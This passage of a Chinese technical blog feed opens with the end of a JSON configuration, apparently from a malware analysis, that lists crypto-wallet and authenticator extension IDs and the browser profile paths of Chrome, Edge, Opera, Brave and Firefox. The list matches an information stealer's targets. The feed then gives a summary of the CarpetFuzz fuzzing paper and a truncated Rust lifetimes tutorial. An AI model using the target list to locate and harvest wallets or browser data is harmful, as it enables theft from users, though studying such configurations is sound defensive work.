Client&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;klnaejjgbibmhlephnhpmaofohgkpgkd&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ZilPay&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aeachknmefphepccionboohckonoeemg&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Coin98&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bhghoamapcdpbohphigoooaddinpkbai&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Authenticator&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dkdedlpgdmmkkfjabffeganieamfklkm&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Cyano&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nlgbhdfgdhgbiamfdfmbikcdghidoadd&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Byone&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;infeboajgfhgbjpjbeppbkgnabfdkdaf&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;OneKey&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cihmoadaighcejopammfbmddcmdekcje&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Leaf&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gaedmjdfmmahhbjefcbgaolhhanlaolb&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Authy&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;oeljdldpnmdbchonielidgobddfffla&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;EOS Authenticator&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ilgcnhelpchnceeipipijaljkblbcob&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GAuth Authenticator&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;imloifkgjagghnncjkhggdhalmcnfklk&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Trezor Password Manager&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bfnaelmomeimhlpmgjnjophhpkkoljpa&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Phantom&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ppbibelpcjmhbdihakflkdcoccbgbkpo&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UniSat&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;n&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%localappdata%\\Google\\Chrome\\User Data&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Chrome&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%localappdata%\\Chromium\\User Data&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Chromium&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%localappdata%\\Microsoft\\Edge\\User Data&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Edge&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%localappdata%\\Kometa\\User Data&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Kometa&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%appdata%\\Opera Software\\Opera Stable&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Opera Stable&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%appdata%\\Opera Software\\Opera GX Stable&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Opera GX Stable&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%appdata%\\Opera Software\\Opera Neon\\User Data&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Opera Neon&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%localappdata%\\BraveSoftware\\Brave-Browser\\User Data&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Brave Software&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%localappdata%\\Comodo\\Dragon\\User Data&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Comodo&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%localappdata%\\CocCoc\\Browser\\User Data&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CocCoc&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%appdata%\\Mozilla\\Firefox\\Profiles&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Mozilla Firefox&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>论文精炼：CarpetFuzz</title>
      <link href="//carpet-fuzz/"/>
      <url>//carpet-fuzz/</url>
      
        <content type="html"><![CDATA[<h1 id="论文精炼：CarpetFuzz"><a href="#论文精炼：CarpetFuzz" class="headerlink" title="论文精炼：CarpetFuzz"></a>论文精炼：CarpetFuzz</h1><h1 id="CarpetFuzz"><a href="#CarpetFuzz" class="headerlink" title="CarpetFuzz"></a>CarpetFuzz</h1><h2 id="Automatic-Program-Option-Constraint-Extraction-from"><a href="#Automatic-Program-Option-Constraint-Extraction-from" class="headerlink" title="Automatic Program Option Constraint Extraction from"></a>Automatic Program Option Constraint Extraction from</h2><p>Documentation for Fuzzing</p><h2 id="核心Idea"><a href="#核心Idea" class="headerlink" title="核心Idea"></a>核心Idea</h2><p>现代的大规模软件项目往往存在大量程序选项。有些漏洞需要特定参数的组合触发。然而我们不能简单地穷举这些参数的排列组合，因为这会导致工作量指数级别的膨胀。我们注意到许多参数之间存在互斥、依赖等关系，而这些关系正记录在Manual中。因此本篇文章通过NLP的手段从文档中提取参数关系并应用于Fuzzing（基于AFL）中（名为CarpetFuzz，<strong>开源</strong>）。</p><p>关键参数：</p><p>参数组合准确性？Precision: 96.10%  Recall: 88.85%</p><p>和暴力排列相比减少的工作量？68%</p><p>和一般的Fuzz相比，额外的路径？46%</p><p><strong>这篇paper是比较工程性的工作？</strong></p><p>精华所在是对隐式的选项关系进行提炼，而核心思路是找到不同选项描述中结构类似的句子对，从而得出两个选项的冲突关系。</p><h2 id="行文逻辑"><a href="#行文逻辑" class="headerlink" title="行文逻辑"></a>行文逻辑</h2><ul><li>大型项目（Kernel&#x2F;Apache&#x2F;…）结构极其复杂，攻击面广，利用链深。人工审阅代码几乎已经不可能。<strong>自动化是所有软件测试方法的大势所趋，</strong>包括Fuzz在内的自动化技术被官方探索应用。</li><li>对于Fuzz而言，覆盖率是金标准（之一）。然而许多项目的覆盖率不够理想，文章认为其中一个原因是<strong>忽视了程序命令行参数</strong>对程序运行的影响。某些代码块只有在特定参数组合下才存在遍历的可能。</li><li>然而简单的穷举不可行：ImageMagick有242个不同的选项。参数的常见组合也许是个好想法，文章的idea则是只保留<strong>可行</strong>组合，而非像先前的一些工作直接把参数纳入变异。</li><li>难点：选项间的依赖关系在文档中以自然语言描述。Solution：<strong>NLP</strong><ul><li>刁钻的示例（强context）<ul><li>依赖：<code>-o在-g启用时将添加额外调试输出</code></li><li>冲突：<code>xx选项仅在正式环境中启用……要切换到正式环境请使用—release</code></li></ul></li></ul></li></ul><h2 id="NLP具体方法"><a href="#NLP具体方法" class="headerlink" title="NLP具体方法"></a>NLP具体方法</h2><ol><li>给定一个程序的文档</li><li>CarpetFuzz解析“OPTIONS”部分提取出所有选项及其相应的statement</li><li>CarpetFuzz使用机器学习来确定statement中是否声明了某种关系<ol><li>由于这样的statement在文档中占比小，文章使用基于熵的不确定性采样（主动学习），来减少人工标记训练数据的工作量。</li><li>针对上述的隐晦的自然语言statement，解决方案是让CarpetFuzz总结一系列“隐含statement”的特征，并利用NLP找到满足这些特征的所有<strong>“sentence pairs”</strong></li></ol></li><li>这样依赖关系就可以被确定，从而构建一个依赖树</li><li><strong>CarpetFuzz正向&#x2F;反向遍历依赖树中找到与关系相关的节点</strong>*<ol><li>（说实话我没看懂这边）</li></ol></li><li><strong>CarpetFuzz基于语言学，利用polarity-based的有限状态机确定具体的关系</strong>*<ol><li>(其实就是双重否定表肯定这种比较简单的状态机)</li></ol></li><li>CarpetFuzz最终得以筛选出所有可用参数组合</li></ol><h2 id="背景工作"><a href="#背景工作" class="headerlink" title="背景工作"></a>背景工作</h2><p><img src="/carpet-fuzz/process.png" alt="经典Fuzzing流程，Option预定义好并固定不参与实际执行" loading="lazy"></p><p>经典Fuzzing流程，Option预定义好并固定不参与实际执行</p><h3 id="关于命令行参数相关Fuzzing的其他工作"><a href="#关于命令行参数相关Fuzzing的其他工作" class="headerlink" title="关于命令行参数相关Fuzzing的其他工作"></a>关于命令行参数相关Fuzzing的其他工作</h3><p><code>AFLargv</code>：限制命令行参数的数量和范围；</p><p>Song等 ：通过检查参数对程序运行的影响来判断有效性；</p><p>Zeller等人 ：通过特定选项解析模块推断。</p><p><strong>局限性：效率低</strong></p><p><code>ConfigFuzz</code> ：手动检查，需要熟悉测试的目标软件用法，对测试人员以及大规模测试是无法接受的。</p><h3 id="基于NLP的其他工作"><a href="#基于NLP的其他工作" class="headerlink" title="基于NLP的其他工作"></a>基于NLP的其他工作</h3><p>主要方向：代码注释+严格格式化文档，局限性强</p><h2 id="程序结构"><a href="#程序结构" class="headerlink" title="程序结构"></a>程序结构</h2><p><img src="/carpet-fuzz/construction.png" alt="Untitled" loading="lazy"></p><p>Overview of CarpetFuzz. <strong>EDR: explicitly declared<br>relationships, IDR: implicitly declared relationships.</strong></p><p>R&#x3D;Relationship</p><p>数据集来源：<code>man</code> 命令的说明页面</p><p>拆分句子→识别包含选项关系的句子（<strong>R句子</strong>）</p><p>关系：<strong>冲突、依赖、（蕴含、相似和取代 &#x3D;冲突，因为复用不能有效增加覆盖率）</strong></p><p><img src="/carpet-fuzz/sentence-search.png" alt="寻找R句子" loading="lazy"></p><p>寻找R句子</p><p>添加主语是为了避免NLP的解析错误。</p><p>还有一个预处理是把选项名字替换为自定义标识符以免干扰分析（这怎么发现的？）。</p><p>某个选项的关键是<strong>谓词（效果）与目标（作用对象）</strong>。</p><h3 id="隐式的冲突参数"><a href="#隐式的冲突参数" class="headerlink" title="隐式的冲突参数"></a>隐式的冲突参数</h3><p>实际上，<strong>隐式的描述语句只涉及冲突：例如，-B和-L选项的描述分别是“Force output to be written with Big-Endian byte order”和“Force output to be written with Little-Endian byte order”</strong></p><p>那么这些句子的语法树结构是相同的。因此这些“sentence pairs”很关键，需要被提取识别。</p><p>同时还有一些常见的冲突写法，例如用<code>|</code> 分隔。当然这也可能是别名，具体看描述句子中是“这些参数”还是“这个参数”来确定到底是别名还是一些冲突的参数。</p><h3 id="极性分析"><a href="#极性分析" class="headerlink" title="极性分析"></a>极性分析</h3><p>情感分析常用，这里用来解析参数之间的冲突</p><p><img src="/carpet-fuzz/nlp.png" alt="Untitled" loading="lazy"></p><p>例如主语A对(B&amp;C)呈现negative的极性，我们就可以认为A不能与B&#x2F;C一起使用。</p><p><a href="https://github.com/JackKuo666/NLP_basis/blob/master/%E7%AC%AC%E5%9B%9B%E7%AB%A0%EF%BC%9A%E4%BE%9D%E5%AD%98%E5%8F%A5%E6%B3%95%E5%92%8C%E8%AF%AD%E4%B9%89%E4%BE%9D%E5%AD%98%E5%88%86%E6%9E%90.md"></a></p><aside>💡 个人认为这个做法效果不错的原因可能是文章提到的"combine with"、"imply"、"like"、"ignore”这些关键词，技术文档的语法还是相对好分析的，对复杂的语句可能会有问题。所以如果把软件技术讨论社区的相关博文丢进大模型是不是会有更丰富的信息蒸馏出来？</aside><p>神经网络实现的分类器来判断一个句子有多大可能是R句子。准确率是比较高的，但召回率比我想的多。</p><h2 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h2><p>文章首先认为参数数量超过一定数量没有实际意义（大部分生产环境下也用不到更多的）。测试也表明基本上超过6个参数就很难有新的发现。所以使用6-wise</p><p>为了找到更有价值的参数组合，测试器会关注参数的变化能够引导出多少新的代码路径覆盖率；对于太低价值的组合会逐渐被剪枝掉。</p><p>那这边实际上是Song.的工作的Idea了。</p><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><p>剩下的主要是一些对实现细节（例如模型超参数、预处理工作）的一些描述。</p><p>然后还有就是有效性度量，主要是准确率和性能速度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Q1. CarpetFuzz的性能如何？</span><br><span class="line">Q2. 关系识别的准确性如何？（那必须好）</span><br><span class="line">Q3. 关系提取的准确性如何？（那必须好）</span><br><span class="line">**Q4. CarpetFuzz的优先级排序技术的有效性如何？</span><br><span class="line">  “结果显示，相比随机抽样，我们的剪枝技术可以减少更多组合（<span class="number">98.91</span>%），</span><br><span class="line">同时仅略微损失边的覆盖率（<span class="number">2.54</span>%）”**</span><br><span class="line">Q5. 与最先进技术相比，CarpetFuzz的模糊测试性能如何？（那必须好，因为前人的工作看起来确实比较粗糙）</span><br><span class="line">Q6. CarpetFuzz能否发现真实世界的漏洞？（事实证明可以）</span><br></pre></td></tr></table></figure><p>在5次48h的fuzzing中，</p><blockquote><p>结果显示，平均有94.59%的CarpetFuzz的唯一边没有被其他模糊器发现，CarpetFuzz平均能够帮助AFL发现多出45.97%的边。</p></blockquote><p>边指的是构成代码路径的jmp之类的跳转？</p><p>“唯一边”这个性能指标确实可以展示其能发现新的未被探索过的代码路径。</p><p>Real-world测试也发现了很多特殊的crash，然后搞到43个0day</p><h2 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h2><p>这篇文章也指出局限性主要来自NLP模型的准确率问题（猜到了）。不过好在这基本只会导致跑太多无效的测试，并不怎么漏报。</p><p>还有一个问题是缺乏人类常识，例如他不知道水平和垂直是反义词。解决方案是知识图谱（是否有点太古典机器学习了）</p><p><strong>我怎么觉得这俩问题都是大语言模型最擅长的？</strong></p><h2 id="文章总结"><a href="#文章总结" class="headerlink" title="文章总结"></a>文章总结</h2><p>原文摘抄如下：</p><blockquote><p>我们设计并实现了CarpetFuzz，一种基于自然语言处理的模糊测试辅助技术，用于提取程序选项约束。通过采用主动学习、机器学习和自然语言处理技术，CarpetFuzz能够准确地从文档中提取选项之间的关系，并过滤掉67.91%的组合选项。借助经过修剪的有效组合，CarpetFuzz帮助AFL在20个常用程序中找到了其他模糊器无法发现的路径的增加了45.97%，并发现了57个独特的崩溃，其中30个被分配了CVE ID。此外，CarpetFuzz在之前的基准测试中发现了94个独特的崩溃，是之前工作的1.71倍。</p></blockquote><p>感谢您的阅读🙂</p>]]></content>
      
      
      <categories>
          
          <category> Paper Distilled </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NLP </tag>
            
            <tag> Fuzzing </tag>
            
            <tag> AFL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rust类型系统中的生命周期</title>
      <link href="/2023/09/05/rust-lifetime/"/>
      <url>/2023/09/05/rust-lifetime/</url>
      
        <content type="html"><![CDATA[<h1 id="Rust类型系统中的生命周期"><a href="#Rust类型系统中的生命周期" class="headerlink" title="Rust类型系统中的生命周期"></a>Rust类型系统中的生命周期</h1><p><em>[2024-04-11 更新] 修正了一些错误，采纳了一些读者反馈可以增加的解释，在此表示感谢。</em></p><p>Rust的生命周期应被视为类型系统的一部分。这是我的粗浅理解，理解错误难免，若发现恳请斧正！<br>以下几节试图渐进地、但从不同角度理解该问题；只要看懂一节也许就足够了，所以可以都看看？<br><strong>提示：如果您有函数式编程基础，这篇文章看起来会很幼稚。“不就是一堆monad吗？”</strong></p><hr><p>一开始看到生命周期和泛型写在一起也许会感到诧异：但事实上生命周期就是类型系统的一部分，泛型指明某一值能进行什么运算，生命周期指明某一值在什么区间内才有效、才可以参与运算。既然能接受泛型加入类型系统并参与类型的运算，生命周期也应同理。<br>贴段代码大伙大概感受一下：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::fmt::Display;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">longest_with_an_announcement</span>&lt;<span class="symbol">&#x27;a</span>, T&gt;(x: &amp;<span class="symbol">&#x27;a</span> <span class="type">str</span>, y: &amp;<span class="symbol">&#x27;a</span> <span class="type">str</span>, ann: T) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;a</span> <span class="type">str</span></span><br><span class="line">    <span class="keyword">where</span> T: Display</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Announcement! &#123;&#125;&quot;</span>, ann);</span><br><span class="line">    <span class="keyword">if</span> x.<span class="title function_ invoke__">len</span>() &gt; y.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">        x</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        y</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>x,y是字符串slice，在C&#x2F;C++中对应字符串指针；在C语言中，这样的<strong>指针在字符串失效后有可能仍被调用（悬垂指针）</strong>，就带来危险。而Rust如何解决这一问题呢？答案是通过所有权机制和生命周期，确认值的有效期究竟何时开始，何时结束（这就称为<strong>生命周期</strong>），禁止在值的生命周期外进行引用、读取、修改等操作。<br>Rust里没有“赋值”，只有“绑定”：我们把一个变量名绑定到一个值上，因此这些生命周期注解，仍旧针对的是值：它是一些实际存在的值（字面量、变量储存的值、函数、闭包……）的固有属性，不是虚无缥缈的。  </p><blockquote><p>📘 根据现代Rust自带的一些约束推导规则，~95%的情况下生命周期注解能被编译器自动推断。但手动的注解有时无法避免：尤其是结构体中。</p></blockquote><p>在这个例子中，由于这个if的存在，Rust编译器无法判断返回值的有效期到底和x一样还是和y一样。<br>我们要添加类型推断（是的，生命周期也是一种泛型），x、y具有同名的生命周期注解’a，根据规则’a取x和y生命周期的交集：x,y都有效时，返回值一定有效！这样就避免了C&#x2F;C++中悬垂指针带来的危险。  </p><hr><p>也许有人会问，为什么调用该函数时，如果传入的参数生命周期不同，会取较短的？<br>我们要在集合论的角度考虑：我们说想要一只动物，那么给与可爱的猫是可以接受的，因为猫是动物的子集。事实上，子集（$\subseteq$）<strong>是</strong>一种偏序关系。而生命周期也<strong>存在</strong>一种偏序关系：我们把<strong>这种关系叫subtype</strong>。假设对于两个生命周期L1和生命周期L2，且有L1是L2的subtype，那我们就记作<code>&#39;L1&lt;:&#39;L2</code>，<em>vice versa</em>.<br>显然，生命周期越长越“好”（也就是泛用）。所以一开始我们就知道<code>&#39;long &lt;: &#39;short</code>，也就是长寿的可以自裁(cast过去)变成短命的，但是短命的没法强行续命变成长命的（类比上面猫与动物的例子，我们要求一个参数需要有特定生命周期时，更长的甚至static都是可以接受的，但绝不能更短：否则Rust布道者赖以为生的内存安全要出事了）。<br>当然，还有一个显然：<code>&#39;static</code>是所有类型的subtype.<br>(不用太纠结为什么是<code>&#39;long &lt;: &#39;short</code>，偏序关系倒过来没有本质区别，这边只是强调<code>&#39;long</code>更好，物以稀为贵，所以“更少”就放左边了)<br>什么意思呢？<strong>简而言之，L1的约束比L2更松</strong>。我们看一个例子，讨论<strong>函数间</strong>的偏序关系：</p><ul><li>假设有函数f1(x)和f2(x)，唯一的区别是f1对传进来的x的生命周期的最低要求更长，那么能用f1的地方就能用f2，但能用f2的地方不一定能用f1，因此f2更泛用，f2≼f1</li><li>假设有函数f1()-&gt;x和f2()-&gt;x，唯一的区别是f1的返回值x的生命周期比f2的长，那么需要其返回值的地方能用f2就一定能用f1，反之则不然，因此f1更泛用，f1≼f2</li><li>思考题：那<code>mut&amp;&#39;a T</code>和<code>T</code>呢？见下文</li><li><strong>就像int32可以转int64（数据范围更难满足-&gt;数据范围更易满足）而反之不行一样单向，subtype可以向右侧cast（长命百岁-&gt;至少活10年）；但反之是不安全的。</strong></li><li>因此，约束关系推导出来的最终生命周期是最严格的，宁可错杀一千也不会放过一个；就是可能有些人工检查过，可以保证安全的操作会被笨笨的生命周期约束拦下：这时就需要你动用unsafe黑魔法了</li></ul><hr><p>所以现在我们要把生命周期理解为类型系统的一部分时，困惑可能来源于为什么不像整形一样规则简单（小int永远是大int的subtype），而包含生命周期的类型系统则有时并不如此：可能不存在这个偏序关系，也可能反过来下克上。<br><strong>我们要明确，函数签名之类的是对类型进行的一种运算</strong>。你可以理解为函数对值运算，而函数签名对类型进行运算。是不是有点像物理上的<strong>量纲分析！</strong>。<br>换言之，这些带泛型或者生命周期的东西（不管是<code>Vec&lt;T&gt;</code>还是<code>&lt;T&gt;T-&gt;T</code>，别忘了函数也是类型一种类型，也属于<code>T</code>），本质上是类型之间的Functor.<br>因此，我们可以把上一节的<code>f1</code> <code>f2</code>都拆开来看，当作一种运算，看看他对生命周期做了什么。<br>例如，对于函数参数，参数受较短生命周期的约束——如上一节分析的那样——我们发现<code>&#39;long &lt;: &#39;short</code> &#x3D;&gt; <code>F(&#39;short) &lt;: F(&#39;long)</code> (颠倒了！剧透：这叫逆变(contravariance))，而长寿者可以降级为短命者；而对返回值来说，恰恰相反：我们只知道至少可以活多么久，活更长对于使用返回值的表达式来说也一定可以接受，此时<code>&#39;long &lt;: &#39;short</code> &#x3D;&gt; <code>(F()-&gt;&#39;long) &lt;: (F()-&gt;&#39;short)</code>（关系保持！剧透：这叫协变(covariance)）……其中，<code>&lt;:</code>左右两侧的表达式——或者说函数签名——正对应上一节的<code>f1</code> <code>f2</code>，我们只是把<code>≼</code>换成了<code>&lt;:</code>。  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">颠倒了的就是contravariant，不变就是covariant，根本没法推出关系的就是invariant.</span><br></pre></td></tr></table></figure><p>invariant就是上面思考题那种。至于原因，最后一节会有个特别轻松易懂的解释<code>:)</code>  </p><hr><p>为什么要搞得这么数学（离散数学&#x2F;范畴论）？因为当类型系统的偏序关系网浮出水面，系统里隐含的约束也就能被自然推导。<br><strong>如果对于用到的类型，这个偏序集合是格（有上下确界），那么编译器会开心的帮你标记好一切生命周期</strong>；<br><strong>如果没有办法cast导致编译器在约束求解中无法找出某些类型的上下确界，甚至出现了环——不好意思，还是得另请高明（程序员）来标清楚。</strong><br>例如上面那段代码为两个参数都标注<code>&#39;a</code>其实等效于在a、b固有的、不受约束的生命周期（远古版本反人体工程学rust必须写明所有生命周期，现在能自动推导绝大部分）中添加了两条约束：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span 